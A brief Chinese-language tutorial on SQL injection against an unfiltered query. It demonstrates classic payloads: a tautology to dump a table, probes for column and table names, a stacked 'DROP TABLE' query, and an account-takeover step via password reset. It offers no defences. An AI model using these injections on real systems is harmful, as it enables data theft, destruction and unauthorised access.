# sql注入

## 原理

“SQL注入”是一种利用未过滤/未审核用户输入的攻击方法（“缓存溢出”和这个不同），意思就是让应用运行本不应该运行的SQL代码。如果应用毫无防备地创建了SQL字符串并且运行了它们，就会造成一些出人意料的结果。

## 示例代码

以下代码是不被过滤的sql代码，通过一个个例子，我们可以实现盗取数据库中尽可能多的信息

php源码

```php
SELECT fieldlist
FROM table
 WHERE field = '$EMAIL';
```

### 1. 通过构造永真式，获取该表中所有的`fieldlist`

通过输入构造php变量`anything’ OR ‘x’=‘x`

代入原句中的代码为

```sql
SELECT fieldlist
FROM table
WHERE field = ‘anything’ or 'x'='x';
```

由于`where`后面的条件全为真，因此获得的输出为该表中所有的`fieldlist`

### 2. 获取表中其他字段名

通过输入构造语句

```sql
SELECT fieldlist
  FROM table
 WHERE field = 'x' AND email IS NULL; --';
```

该段代码在已知表中一个属性为x的情况下，构造了`and email is null`的条件，并且后方加入了sql中的注释:`--`,该段在sql中执行的过程为：如果没有`email`字段，返回`server error`，如果存在字段，没有反应。

### 3. 获取其他表的名字

```sql
SELECT email, passwd, login_id, full_name
  FROM table
 WHERE email = 'x' AND 1=(SELECT COUNT(*) FROM tabname); --';
```

如果没有该`tabname`对应的表名，会报错

### 对数据库进行任意sql语句的执行

```sql
SELECT email, passwd, login_id, full_name
  FROM members
 WHERE email = 'x'; DROP TABLE members; --';  -- Boom!
```

通过添加分号，然后添加任意sql语句，在执行第一条语句之后，便可执行下一条语句，如删除表，添加数据库用户，插入数据等任何操作。

### 4. 进行提权操作

通过已知某用户权限高的情况下，修改其默认手机等，再选择忘记密码，可以获得登陆权限，进入系统。
